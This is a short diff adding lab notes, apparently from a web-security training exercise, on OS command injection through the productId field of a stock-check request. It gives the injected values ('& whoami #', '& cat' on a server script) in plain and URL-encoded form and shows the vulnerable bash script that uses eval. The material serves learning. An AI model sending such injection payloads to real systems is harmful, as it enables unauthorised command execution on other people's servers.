@@ -1,0 +1,23 @@
+OS Command Injectino, simple case
+Goal: Exploit command injection to execute whoami command.
+
+1)
+-Click on a product
+-Click on Check stock
+-Send the Post to Repeater
+
+2)
+-productId=1 & whoami #&storeId=1
+-encode, productId=1+%26+whoami+#&storeId=1
+
+3)
+-Send the command without the #
+-Grab the directory and file name, /home/peter-o1rPSU/stockreport.sh
+-productId=1 & cat /home/peter-o1rPSU/stockreport.sh #&storeId=1
+-encode, productId=1+%26+cat+/home/peter-o1rPSU/stockreport.sh+%23&storeId=1
+->
+#!/bin/bash
+
+set -eu
+
+eval cksum <<< "$1 $2" | cut -c 2-3 | rev | sed s/0/1/
